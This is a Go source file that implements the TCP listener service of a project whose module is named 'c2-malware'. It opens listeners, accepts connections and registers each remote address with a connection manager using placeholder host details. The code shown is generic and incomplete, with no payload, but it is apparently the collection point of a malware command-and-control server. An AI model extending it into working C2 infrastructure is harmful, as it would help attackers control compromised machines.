package listener

import (
	"c2-malware/internal/connections"
	"fmt"
	"net"
	"sync"
)

type Service struct {
	mu          sync.Mutex
	listeners   map[string]net.Listener
	connManager *connections.Manager
}

func NewService(connMgr *connections.Manager) *Service {
	return &Service{
		listeners:   make(map[string]net.Listener),
		connManager: connMgr,
	}
}

func (s *Service) OpenListener(ip, port string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	addr := net.JoinHostPort(ip, port)
	if _, exists := s.listeners[addr]; exists {
		return fmt.Errorf("listener already exists on %s", addr)
	}

	l, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}

	s.listeners[addr] = l

	go func() {
		for {
			conn, err := l.Accept()
			if err != nil {
				return
			}
			go s.handleConnection(conn)
		}
	}()

	return nil
}

func (s *Service) ListListeners() []string {
	s.mu.Lock()
	defer s.mu.Unlock()

	keys := make([]string, 0, len(s.listeners))
	for k := range s.listeners {
		keys = append(keys, k)
	}
	return keys
}

func (s *Service) handleConnection(conn net.Conn) {
	defer conn.Close()
	fmt.Println("New connection from", conn.RemoteAddr())

	//TO-DO: CHANGE THIS WITH REAL DATA
	s.connManager.AddConnection(
		conn.RemoteAddr().String(),
		"unknown",
		"unknown-host",
		"unknown",
	)
}
